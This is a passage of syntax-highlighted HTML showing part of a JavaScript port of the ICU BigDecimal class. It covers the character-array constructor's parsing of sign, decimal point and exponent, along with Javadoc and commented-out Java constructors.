class="line"><span class="comment">  * and the &#123;@link #BigDecimal(java.lang.String)&#125; constructor had then</span></span><br><span class="line"><span class="comment">  * been used. The parameter must not be &lt;code&gt;null&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * Using this constructor is faster than using the</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;BigDecimal(String)&lt;/code&gt; constructor if the string is</span></span><br><span class="line"><span class="comment">  * already available in character array form.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param inchars The &lt;code&gt;char[]&lt;/code&gt; array containing the number</span></span><br><span class="line"><span class="comment">  *                to be converted.</span></span><br><span class="line"><span class="comment">  * @throws NumberFormatException if the parameter is not a valid</span></span><br><span class="line"><span class="comment">  *                number.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public BigDecimal(char inchars[])&#123;</span></span><br><span class="line"> <span class="comment">//-- this(inchars,0,inchars.length);</span></span><br><span class="line"> <span class="comment">//-- return;&#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Constructs a &lt;code&gt;BigDecimal&lt;/code&gt; object from an array of characters.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * Constructs a &lt;code&gt;BigDecimal&lt;/code&gt; as though a</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;String&lt;/code&gt; had been constructed from the character array</span></span><br><span class="line"><span class="comment">  * (or a subarray of that array) and the</span></span><br><span class="line"><span class="comment">  * &#123;@link #BigDecimal(java.lang.String)&#125; constructor had then been</span></span><br><span class="line"><span class="comment">  * used. The first parameter must not be &lt;code&gt;null&lt;/code&gt;, and the</span></span><br><span class="line"><span class="comment">  * subarray must be wholly contained within it.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * Using this constructor is faster than using the</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;BigDecimal(String)&lt;/code&gt; constructor if the string is</span></span><br><span class="line"><span class="comment">  * already available within a character array.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param inchars The &lt;code&gt;char[]&lt;/code&gt; array containing the number</span></span><br><span class="line"><span class="comment">  *                to be converted.</span></span><br><span class="line"><span class="comment">  * @param offset  The &lt;code&gt;int&lt;/code&gt; offset into the array of the</span></span><br><span class="line"><span class="comment">  *                start of the number to be converted.</span></span><br><span class="line"><span class="comment">  * @param length  The &lt;code&gt;int&lt;/code&gt; length of the number.</span></span><br><span class="line"><span class="comment">  * @throws NumberFormatException if the parameter is not a valid</span></span><br><span class="line"><span class="comment">  *                number for any reason.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public BigDecimal(char inchars[],int offset,int length)&#123;super();</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">BigDecimal</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">//-- members</span></span><br><span class="line">  <span class="keyword">this</span>.ind = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">this</span>.form = MathContext.prototype.PLAIN;</span><br><span class="line">  <span class="keyword">this</span>.mant = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">this</span>.exp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//-- overloaded ctor</span></span><br><span class="line">  <span class="keyword">if</span> (BigDecimal.arguments.length == <span class="number">0</span>)</span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">var</span> inchars;</span><br><span class="line">  <span class="keyword">var</span> offset;</span><br><span class="line">  <span class="keyword">var</span> length;</span><br><span class="line">  <span class="keyword">if</span> (BigDecimal.arguments.length == <span class="number">1</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    inchars = BigDecimal.arguments[<span class="number">0</span>];</span><br><span class="line">    offset = <span class="number">0</span>;</span><br><span class="line">    length = inchars.length;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">    inchars = BigDecimal.arguments[<span class="number">0</span>];</span><br><span class="line">    offset = BigDecimal.arguments[<span class="number">1</span>];</span><br><span class="line">    length = BigDecimal.arguments[<span class="number">2</span>];</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> inchars == <span class="string">"string"</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    inchars = inchars.split(<span class="string">""</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//--boolean exotic;</span></span><br><span class="line">  <span class="keyword">var</span> exotic;</span><br><span class="line">  <span class="comment">//--boolean hadexp;</span></span><br><span class="line">  <span class="keyword">var</span> hadexp;</span><br><span class="line">  <span class="comment">//--int d;</span></span><br><span class="line">  <span class="keyword">var</span> d;</span><br><span class="line">  <span class="comment">//--int dotoff;</span></span><br><span class="line">  <span class="keyword">var</span> dotoff;</span><br><span class="line">  <span class="comment">//--int last;</span></span><br><span class="line">  <span class="keyword">var</span> last;</span><br><span class="line">  <span class="comment">//--int i=0;</span></span><br><span class="line">  <span class="keyword">var</span> i=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--char si=0;</span></span><br><span class="line">  <span class="keyword">var</span> si=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--boolean eneg=false;</span></span><br><span class="line">  <span class="keyword">var</span> eneg=<span class="literal">false</span>;</span><br><span class="line">  <span class="comment">//--int k=0;</span></span><br><span class="line">  <span class="keyword">var</span> k=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--int elen=0;</span></span><br><span class="line">  <span class="keyword">var</span> elen=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--int j=0;</span></span><br><span class="line">  <span class="keyword">var</span> j=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--char sj=0;</span></span><br><span class="line">  <span class="keyword">var</span> sj=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--int dvalue=0;</span></span><br><span class="line">  <span class="keyword">var</span> dvalue=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--int mag=0;</span></span><br><span class="line">  <span class="keyword">var</span> mag=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">// This is the primary constructor; all incoming strings end up</span></span><br><span class="line">  <span class="comment">// here; it uses explicit (inline) parsing for speed and to avoid</span></span><br><span class="line">  <span class="comment">// generating intermediate (temporary) objects of any kind.</span></span><br><span class="line">  <span class="comment">// 1998.06.25: exponent form built only if E/e in string</span></span><br><span class="line">  <span class="comment">// 1998.06.25: trailing zeros not removed for zero</span></span><br><span class="line">  <span class="comment">// 1999.03.06: no embedded blanks; allow offset and length</span></span><br><span class="line">  <span class="keyword">if</span> (length&lt;=<span class="number">0</span>)</span><br><span class="line">   <span class="keyword">this</span>.bad(<span class="string">"BigDecimal(): "</span>, inchars); <span class="comment">// bad conversion (empty string)</span></span><br><span class="line">  <span class="comment">// [bad offset will raise array bounds exception]</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Handle and step past sign */</span></span><br><span class="line">  <span class="keyword">this</span>.ind=<span class="keyword">this</span>.ispos; <span class="comment">// assume positive</span></span><br><span class="line">  <span class="keyword">if</span> (inchars[<span class="number">0</span>]==(<span class="string">'-'</span>))</span><br><span class="line">   &#123;</span><br><span class="line">    length--;</span><br><span class="line">    <span class="keyword">if</span> (length==<span class="number">0</span>)</span><br><span class="line">     <span class="keyword">this</span>.bad(<span class="string">"BigDecimal(): "</span>, inchars); <span class="comment">// nothing after sign</span></span><br><span class="line">    <span class="keyword">this</span>.ind=<span class="keyword">this</span>.isneg;</span><br><span class="line">    offset++;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   <span class="keyword">if</span> (inchars[<span class="number">0</span>]==(<span class="string">'+'</span>))</span><br><span class="line">    &#123;</span><br><span class="line">     length--;</span><br><span class="line">     <span class="keyword">if</span> (length==<span class="number">0</span>)</span><br><span class="line">      <span class="keyword">this</span>.bad(<span class="string">"BigDecimal(): "</span>, inchars); <span class="comment">// nothing after sign</span></span><br><span class="line">     offset++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We're at the start of the number */</span></span><br><span class="line">  exotic=<span class="literal">false</span>; <span class="comment">// have extra digits</span></span><br><span class="line">  hadexp=<span class="literal">false</span>; <span class="comment">// had explicit exponent</span></span><br><span class="line">  d=<span class="number">0</span>; <span class="comment">// count of digits found</span></span><br><span class="line">  dotoff=<span class="number">-1</span>; <span class="comment">// offset where dot was found</span></span><br><span class="line">  last=<span class="number">-1</span>; <span class="comment">// last character of mantissa</span></span><br><span class="line">  &#123;<span class="keyword">var</span> $<span class="number">1</span>=length;i=offset;i:<span class="keyword">for</span>(;$<span class="number">1</span>&gt;<span class="number">0</span>;$<span class="number">1</span>--,i++)&#123;</span><br><span class="line">   si=inchars[i];</span><br><span class="line">   <span class="keyword">if</span> (si&gt;=<span class="string">'0'</span>)  <span class="comment">// test for Arabic digit</span></span><br><span class="line">    <span class="keyword">if</span> (si&lt;=<span class="string">'9'</span>)</span><br><span class="line">     &#123;</span><br><span class="line">      last=i;</span><br><span class="line">      d++; <span class="comment">// still in mantissa</span></span><br><span class="line">      <span class="keyword">continue</span> i;</span><br><span class="line">     &#125;</span><br><span class="line">   <span class="keyword">if</span> (si==<span class="string">'.'</span>)</span><br><span class="line">    &#123; <span class="comment">// record and ignore</span></span><br><span class="line">     <span class="keyword">if</span> (dotoff&gt;=<span class="number">0</span>)</span><br><span class="line">      <span class="keyword">this</span>.bad(<span class="string">"BigDecimal(): "</span>, inchars); <span class="comment">// two dots</span></span><br><span class="line">     dotoff=i-offset; <span class="comment">// offset into mantissa</span></span><br><span class="line">     <span class="keyword">continue</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">if</span> (si!=<span class="string">'e'</span>)</span><br><span class="line">    <span class="keyword">if</span> (si!=<span class="string">'E'</span>)</span><br><span class="line">     &#123; <span class="comment">// expect an extra digit</span></span><br><span class="line">      <span class="keyword">if</span> (si&lt;<span class="string">'0'</span> || si&gt;<span class="string">'9'</span>)</span><br><span class="line">       <span class="keyword">this</span>.bad(<span class="string">"BigDecimal(): "</span>, inchars); <span class="comment">// not a number</span></span><br><span class="line">      <span class="comment">// defer the base 10 check until later to avoid extra method call</span></span><br><span class="line">      exotic=<span class="literal">true</span>; <span class="comment">// will need conversion later</span></span><br><span class="line">      last=i;</span><br><span class="line">      d++; <span class="comment">// still in mantissa</span></span><br><span class="line">      <span class="keyword">continue</span> i;</span><br><span class="line">     &#125;</span><br><span class="line">   <span class="comment">/* Found 'e' or 'E' -- now process explicit exponent */</span></span><br><span class="line">   <span class="comment">// 1998.07.11: sign no longer required</span></span><br><span class="line">   <span class="keyword">if</span> ((i-offset)&gt;(length<span class="number">-2</span>))</span><br><span class="line">    <span class="keyword">this</span>.bad(<span class="string">"BigDecimal(): "</span>, inchars); <span class="comment">// no room for even one digit</span></span><br><span class="line">   eneg=<span class="literal">false</span>;</span><br><span class="line">   <span class="keyword">if</span> ((inchars[i+<span class="number">1</span>])==(<span class="string">'-'</span>))</span><br><span class="line">    &#123;</span><br><span class="line">     eneg=<span class="literal">true</span>;</span><br><span class="line">     k=i+<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">if</span> ((inchars[i+<span class="number">1</span>])==(<span class="string">'+'</span>))</span><br><span class="line">     k=i+<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">     k=i+<span class="number">1</span>;</span><br><span class="line">   <span class="comment">// k is offset of first expected digit</span></span><br><span class="line">   elen=length-((k-offset)); <span class="comment">// possible number of digits</span></span><br><span class="line">   <span class="keyword">if</span> ((elen==<span class="number">0</span>)||(elen&gt;<span class="number">9</span>))</span><br><span class="line">    <span class="keyword">this</span>.bad(<span class="string">"BigDecimal(): "</span>, inchars); <span class="comment">// 0 or more than 9 digits</span></span><br><span class="line">   &#123;<span class="keyword">var</span> $<span class="number">2</span>=elen;j=k;j:<span class="keyword">for</span>(;$<span class="number">2</span>&gt;<span class="number">0</span>;$<span class="number">2</span>--,j++)&#123;</span><br><span class="line">    sj=inchars[j];</span><br><span class="line">    <span class="keyword">if</span> (sj&lt;<span class="string">'0'</span>)</span><br><span class="line">     <span class="keyword">this</span>.bad(<span class="string">"BigDecimal(): "</span>, inchars); <span class="comment">// always bad</span></span><br><span class="line">    <span class="keyword">if</span> (sj&gt;<span class="string">'9'</span>)</span><br><span class="line">     &#123; <span class="comment">// maybe an exotic digit</span></span><br><span class="line">      <span class="comment">/*if (si&lt;'0' || si&gt;'9')</span></span><br><span class="line"><span class="comment">       this.bad(inchars); // not a number</span></span><br><span class="line"><span class="comment">      dvalue=java.lang.Character.digit(sj,10); // check base</span></span><br><span class="line"><span class="comment">      if (dvalue&lt;0)</span></span><br><span class="line"><span class="comment">       bad(inchars); // not base 10*/</span></span><br><span class="line">      <span class="keyword">this</span>.bad(<span class="string">"BigDecimal(): "</span>, inchars);</span><br><span class="line">     &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">     dvalue=sj-<span class="string">'0'</span>;</span><br><span class="line">    <span class="keyword">this</span>.exp=(<span class="keyword">this</span>.exp*<span class="number">10</span>)+dvalue;</span><br><span class="line">    &#125;</span><br><span class="line">   &#125;<span class="comment">/*j*/</span></span><br><span class="line">   <span class="keyword">if</span> (eneg)</span><br><span class="line">    <span class="keyword">this</span>.exp=-<span class="keyword">this</span>.exp; <span class="comment">// was negative</span></span><br><span class="line">   hadexp=<span class="literal">true</span>; <span class="comment">// remember we had one</span></span><br><span class="line">   <span class="keyword">break</span> i; <span class="comment">// we are done</span></span><br><span class="line">   &#125;</span><br><span class="line">  &#125;<span class="comment">/*i*/</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Here when all inspected */</span></span><br><span class="line">  <span class="keyword">if</span> (d==<span class="number">0</span>)</span><br><span class="line">   <span class="keyword">this</span>.bad(<span class="string">"BigDecimal(): "</span>, inchars); <span class="comment">// no mantissa digits</span></span><br><span class="line">  <span class="keyword">if</span> (dotoff&gt;=<span class="number">0</span>)</span><br><span class="line">   <span class="keyword">this</span>.exp=(<span class="keyword">this</span>.exp+dotoff)-d; <span class="comment">// adjust exponent if had dot</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* strip leading zeros/dot (leave final if all 0's) */</span></span><br><span class="line">  &#123;<span class="keyword">var</span> $<span class="number">3</span>=last<span class="number">-1</span>;i=offset;i:<span class="keyword">for</span>(;i&lt;=$<span class="number">3</span>;i++)&#123;</span><br><span class="line">   si=inchars[i];</span><br><span class="line">   <span class="keyword">if</span> (si==<span class="string">'0'</span>)</span><br><span class="line">    &#123;</span><br><span class="line">     offset++;</span><br><span class="line">     dotoff--;</span><br><span class="line">     d--;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">if</span> (si==<span class="string">'.'</span>)</span><br><span class="line">     &#123;</span><br><span class="line">      offset++; <span class="comment">// step past dot</span></span><br><span class="line">      dotoff--;</span><br><span class="line">     &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">     <span class="keyword">if</span> (si&lt;=<span class="string">'9'</span>)</span><br><span class="line">      <span class="keyword">break</span> i;<span class="comment">/* non-0 */</span></span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">      &#123;<span class="comment">/* exotic */</span></span><br><span class="line">       <span class="comment">//if ((java.lang.Character.digit(si,10))!=0)</span></span><br><span class="line">        <span class="keyword">break</span> i; <span class="comment">// non-0 or bad</span></span><br><span class="line">       <span class="comment">// is 0 .. strip like '0'</span></span><br><span class="line">       <span class="comment">//offset++;</span></span><br><span class="line">       <span class="comment">//dotoff--;</span></span><br><span class="line">       <span class="comment">//d--;</span></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;<span class="comment">/*i*/</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Create the mantissa array */</span></span><br><span class="line">  <span class="keyword">this</span>.mant=<span class="keyword">new</span> <span class="built_in">Array</span>(d); <span class="comment">// we know the length</span></span><br><span class="line">  j=offset; <span class="comment">// input offset</span></span><br><span class="line">  <span class="keyword">if</span> (exotic)</span><br><span class="line">   &#123;<span class="attr">exotica</span>:<span class="keyword">do</span>&#123; <span class="comment">// slow: check for exotica</span></span><br><span class="line">    &#123;<span class="keyword">var</span> $<span class="number">4</span>=d;i=<span class="number">0</span>;i:<span class="keyword">for</span>(;$<span class="number">4</span>&gt;<span class="number">0</span>;$<span class="number">4</span>--,i++)&#123;</span><br><span class="line">     <span class="keyword">if</span> (i==dotoff)</span><br><span class="line">      j++; <span class="comment">// at dot</span></span><br><span class="line">     sj=inchars[j];</span><br><span class="line">     <span class="keyword">if</span> (sj&lt;=<span class="string">'9'</span>)</span><br><span class="line">      <span class="keyword">this</span>.mant[i]=sj-<span class="string">'0'</span>;<span class="comment">/* easy */</span></span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">       <span class="comment">//dvalue=java.lang.Character.digit(sj,10);</span></span><br><span class="line">       <span class="comment">//if (dvalue&lt;0)</span></span><br><span class="line">        <span class="keyword">this</span>.bad(<span class="string">"BigDecimal(): "</span>, inchars); <span class="comment">// not a number after all</span></span><br><span class="line">       <span class="comment">//mant[i]=(byte)dvalue;</span></span><br><span class="line">      &#125;</span><br><span class="line">     j++;</span><br><span class="line">     &#125;</span><br><span class="line">    &#125;<span class="comment">/*i*/</span></span><br><span class="line">   &#125;<span class="keyword">while</span>(<span class="literal">false</span>);&#125;<span class="comment">/*exotica*/</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   &#123;<span class="attr">simple</span>:<span class="keyword">do</span>&#123;</span><br><span class="line">    &#123;<span class="keyword">var</span> $<span class="number">5</span>=d;i=<span class="number">0</span>;i:<span class="keyword">for</span>(;$<span class="number">5</span>&gt;<span class="number">0</span>;$<span class="number">5</span>--,i++)&#123;</span><br><span class="line">     <span class="keyword">if</span> (i==dotoff)</span><br><span class="line">      j++;</span><br><span class="line">     <span class="keyword">this</span>.mant[i]=inchars[j]-<span class="string">'0'</span>;</span><br><span class="line">     j++;</span><br><span class="line">     &#125;</span><br><span class="line">    &#125;<span class="comment">/*i*/</span></span><br><span class="line">   &#125;<span class="keyword">while</span>(<span class="literal">false</span>);&#125;<span class="comment">/*simple*/</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Looks good.  Set the sign indicator and form, as needed. */</span></span><br><span class="line">  <span class="comment">// Trailing zeros are preserved</span></span><br><span class="line">  <span class="comment">// The rule here for form is:</span></span><br><span class="line">  <span class="comment">//   If no E-notation, then request plain notation</span></span><br><span class="line">  <span class="comment">//   Otherwise act as though add(0,DEFAULT) and request scientific notation</span></span><br><span class="line">  <span class="comment">// [form is already PLAIN]</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">this</span>.mant[<span class="number">0</span>]==<span class="number">0</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    <span class="keyword">this</span>.ind=<span class="keyword">this</span>.iszero; <span class="comment">// force to show zero</span></span><br><span class="line">    <span class="comment">// negative exponent is significant (e.g., -3 for 0.000) if plain</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.exp&gt;<span class="number">0</span>)</span><br><span class="line">     <span class="keyword">this</span>.exp=<span class="number">0</span>; <span class="comment">// positive exponent can be ignored</span></span><br><span class="line">    <span class="keyword">if</span> (hadexp)</span><br><span class="line">     &#123; <span class="comment">// zero becomes single digit from add</span></span><br><span class="line">      <span class="keyword">this</span>.mant=<span class="keyword">this</span>.ZERO.mant;</span><br><span class="line">      <span class="keyword">this</span>.exp=<span class="number">0</span>;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   &#123; <span class="comment">// non-zero</span></span><br><span class="line">    <span class="comment">// [ind was set earlier]</span></span><br><span class="line">    <span class="comment">// now determine form</span></span><br><span class="line">    <span class="keyword">if</span> (hadexp)</span><br><span class="line">     &#123;</span><br><span class="line">      <span class="keyword">this</span>.form=MathContext.prototype.SCIENTIFIC;</span><br><span class="line">      <span class="comment">// 1999.06.29 check for overflow</span></span><br><span class="line">      mag=(<span class="keyword">this</span>.exp+<span class="keyword">this</span>.mant.length)<span class="number">-1</span>; <span class="comment">// true exponent in scientific notation</span></span><br><span class="line">      <span class="keyword">if</span> ((mag&lt;<span class="keyword">this</span>.MinExp)||(mag&gt;<span class="keyword">this</span>.MaxExp))</span><br><span class="line">       <span class="keyword">this</span>.bad(<span class="string">"BigDecimal(): "</span>, inchars);</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="comment">// say 'BD(c[]): mant[0] mantlen exp ind form:' mant[0] mant.length exp ind form</span></span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Constructs a &lt;code&gt;BigDecimal&lt;/code&gt; object directly from a</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;double&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * Constructs a &lt;code&gt;BigDecimal&lt;/code&gt; which is the exact decimal</span></span><br><span class="line"><span class="comment">  * representation of the 64-bit signed binary floating point</span></span><br><span class="line"><span class="comment">  * parameter.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * Note that this constructor it an exact conversion; it does not give</span></span><br><span class="line"><span class="comment">  * the same result as converting &lt;code&gt;num&lt;/code&gt; to a</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;String&lt;/code&gt; using the &lt;code&gt;Double.toString()&lt;/code&gt; method</span></span><br><span class="line"><span class="comment">  * and then using the &#123;@link #BigDecimal(java.lang.String)&#125;</span></span><br><span class="line"><span class="comment">  * constructor.</span></span><br><span class="line"><span class="comment">  * To get that result, use the static &#123;@link #valueOf(double)&#125;</span></span><br><span class="line"><span class="comment">  * method to construct a &lt;code&gt;BigDecimal&lt;/code&gt; from a</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;double&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param num The &lt;code&gt;double&lt;/code&gt; to be converted.</span></span><br><span class="line"><span class="comment">  * @throws NumberFormatException if the parameter is infinite or</span></span><br><span class="line"><span class="comment">  *            not a number.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public BigDecimal(double num)&#123;</span></span><br><span class="line"> <span class="comment">//-- // 1999.03.06: use exactly the old algorithm</span></span><br><span class="line"> <span class="comment">//-- // 2000.01.01: note that this constructor does give an exact result,</span></span><br><span class="line"> <span class="comment">//-- //             so perhaps it should not be deprecated</span></span><br><span class="line"> <span class="comment">//-- // 2000.06.18: no longer deprecated</span></span><br><span class="line"> <span class="comment">//-- this((new java.math.BigDecimal(num)).toString());</span></span><br><span class="line"> <span class="comment">//-- return;&#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Constructs a &lt;code&gt;BigDecimal&lt;/code&gt; object directly from a</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;int&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * Constructs a &lt;code&gt;BigDecimal&lt;/code&gt; which is the exact decimal</span></span><br><span class="line"><span class="comment">  * representation of the 32-bit signed binary integer parameter.</span></span><br><span class="line"><span class="comment">  * The &lt;code&gt;BigDecimal&lt;/code&gt; will contain only decimal digits,</span></span><br><span class="line"><span class="comment">  * prefixed with a leading minus sign (hyphen) if the parameter is</span></span><br><span class="line"><span class="comment">  * negative.</span></span><br><span class="line"><span class="comment">  * A leading zero will be present only if the parameter is zero.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param num The &lt;code&gt;int&lt;/code&gt; to be converted.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public BigDecimal(int num)&#123;super();</span></span><br><span class="line"> <span class="comment">//-- int mun;</span></span><br><span class="line"> <span class="comment">//-- int i=0;</span></span><br><span class="line"> <span class="comment">//-- // We fastpath commoners</span></span><br><span class="line"> <span class="comment">//-- if (num&lt;=9)</span></span><br><span class="line"> <span class="comment">//--  if (num&gt;=(-9))</span></span><br><span class="line"> <span class="comment">//--   &#123;singledigit:do&#123;</span></span><br><span class="line"> <span class="comment">//--    // very common single digit case</span></span><br><span class="line"> <span class="comment">//--    &#123;/*select*/</span></span><br><span class="line"> <span class="comment">//--    if (num==0)</span></span><br><span class="line"> <span class="comment">//--     &#123;</span></span><br><span class="line"> <span class="comment">//--      mant=ZERO.mant;</span></span><br><span class="line"> <span class="comment">//--      ind=iszero;</span></span><br><span class="line"> <span class="comment">//--     &#125;</span></span><br><span class="line"> <span class="comment">//--    else if (num==1)</span></span><br><span class="line"> <span class="comment">//--     &#123;</span></span><br><span class="line"> <span class="comment">//--      mant=ONE.mant;</span></span><br><span class="line"> <span class="comment">//--      ind=ispos;</span></span><br><span class="line"> <span class="comment">//--     &#125;</span></span><br><span class="line"> <span class="comment">//--    else if (num==(-1))</span></span><br><span class="line"> <span class="comment">//--     &#123;</span></span><br><span class="line"> <span class="comment">//--      mant=ONE.mant;</span></span><br><span class="line"> <span class="comment">//--      ind=isneg;</span></span><br><span class="line"> <span class="comment">//--     &#125;</span></span><br><span class="line"> <span class="comment">//--    else&#123;</span></span><br><span class="line"> <span class="comment">//--     &#123;</span></span><br><span class="line"> <span class="comment">//--      mant=new byte[1];</span></span><br><span class="line"> <span class="comment">//--      if (num&gt;0)</span></span><br><span class="line"> <span class="comment">//--       &#123;</span></span><br><span class="line"> <span class="comment">//--        mant[0]=(byte)num;</span></span><br><span class="line"> <span class="comment">//--        ind=ispos;</span></span><br><span class="line"> <span class="comment">//--       &#125;</span></span><br><span class="line"> <span class="comment">//--      else</span></span><br><span class="line"> <span class="comment">//--       &#123; // num&lt;-1</span></span><br><span class="line"> <span class="comment">//--        mant[0]=(byte)((int)-num);</span></span><br><span class="line"> <span class="comment">//--        ind=isneg;</span></span><br><span class="line"> <span class="comment">//--       &#125;</span></span><br><span class="line"> <span class="comment">//--     &#125;</span></span><br><span class="line"> <span class="comment">//--    &#125;</span></span><br><span class="line"> <span class="comment">//--    &#125;</span></span><br><span class="line"> <span class="comment">//--    return;</span></span><br><span class="line"> <span class="comment">//--   &#125;while(false);&#125;/*singledigit*/</span></span><br><span class="line"> <span class="comment">//--</span></span><br><span class="line"> <span class="comment">//-- /* We work on negative numbers so we handle the most negative number */</span></span><br><span class="line"> <span class="comment">//-- if (num&gt;0)</span></span><br><span class="line"> <span class="comment">//--  &#123;</span></span><br><span class="line"> <span class="comment">//--   ind=ispos;</span></span><br><span class="line"> <span class="comment">//--   num=(int)-num;</span></span><br><span class="line"> <span class="comment">//--  &#125;</span></span><br><span class="line"> <span class="comment">//-- else</span></span><br><span class="line"> <span class="comment">//--  ind=isneg;/* negative */ // [0 case already handled]</span></span><br><span class="line"> <span class="comment">//-- // [it is quicker, here, to pre-calculate the length with</span></span><br><span class="line"> <span class="comment">//-- // one loop, then allocate exactly the right length of byte array,</span></span><br><span class="line"> <span class="comment">//-- // then re-fill it with another loop]</span></span><br><span class="line"> <span class="comment">//-- mun=num; // working copy</span></span><br><span class="line"> <span class="comment">//-- &#123;i=9;i:for(;;i--)&#123;</span></span><br><span class="line"> <span class="comment">//--  mun=mun/10;</span></span><br><span class="line"> <span class="comment">//--  if (mun==0)</span></span><br><span class="line"> <span class="comment">//--   break i;</span></span><br><span class="line"> <span class="comment">//--  &#125;</span></span><br><span class="line"> <span class="comment">//-- &#125;/*i*/</span></span><br><span class="line"> <span class="comment">//-- // i is the position of the leftmost digit placed</span></span><br><span class="line"> <span class="comment">//-- mant=new byte[10-i];</span></span><br><span class="line"> <span class="comment">//-- &#123;i=(10-i)-1;i:for(;;i--)&#123;</span></span><br><span class="line"> <span class="comment">//--  mant[i]=(byte)-(((byte)(num%10)));</span></span><br><span class="line"> <span class="comment">//--  num=num/10;</span></span><br><span class="line"> <span class="comment">//--  if (num==0)</span></span><br><span class="line"> <span class="comment">//--   break i;</span></span><br><span class="line"> <span class="comment">//--  &#125;</span></span><br><span class="line"> <span class="comment">//-- &#125;/*i*/</span></span><br><span class="line"> <span class="comment">//-- return;</span></span><br><span class="line"> <span class="comment">//-- &#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Constructs a &lt;code&gt;BigDecimal&lt;/code&gt; object directly from a</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;long&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * Constructs a &lt;code&gt;BigDecimal&lt;/code&gt; which is the exact 